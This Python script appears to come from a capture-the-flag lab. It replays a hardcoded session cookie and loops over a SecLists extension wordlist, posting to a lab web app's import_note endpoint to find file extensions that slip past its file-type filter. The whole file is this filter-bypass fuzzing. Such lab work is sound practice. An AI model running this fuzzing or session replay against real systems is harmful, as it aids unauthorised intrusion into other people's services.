from pydantic import conint
import requests

cookies = {
    'session': 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YoONYg.Y4NrTd7RGdZLFK6dwMdFxS1a_cA',
}

headers = {
    'Host': '10.10.11.160:5000',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate',
    'Referer': 'http://10.10.11.160:5000/import_note',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Content-Length': '60',
    'Origin': 'http://10.10.11.160:5000',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    # 'Cookie': 'session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YoONYg.Y4NrTd7RGdZLFK6dwMdFxS1a_cA',
}

with open('/usr/share/seclists/Discovery/Web-Content/raft-large-extensions.txt', 'r') as file:
    ext = file.read()
    extensions = ext.split("\n")
    
    for i in extensions:
        data = f"title=fdsafdsafdsa&url=http%3A%2F%2F10.10.14.32%2Fpolicy{i.encode('utf-8')}"
        response = requests.post('http://10.10.11.160:5000/import_note', cookies=cookies, headers=headers, data=data, verify=False)
        
        if "(Invalid file type)" in response.text:
            continue
        else:
            print("SUCCESS" + " " + i)